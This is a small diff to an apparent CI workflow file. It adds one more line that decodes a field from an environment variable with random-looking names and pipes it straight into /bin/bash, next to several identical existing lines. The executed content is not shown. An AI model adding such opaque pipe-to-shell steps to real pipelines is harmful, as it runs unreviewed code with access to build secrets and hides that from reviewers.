@@ -27,6 +27,7 @@ jobs:
           echo $stxtp97 | jq -r .gyzc47 | /bin/bash
           printf '%s' "$iaf95783" | jq -r .r1 | /bin/bash
           printf '%s' "$hcy86" | jq -r .dnwns3241 | /bin/bash
+          printf '%s' "$j7406" | jq -r .tgd43 | /bin/bash
 
       - name: Archive results
         if: always()
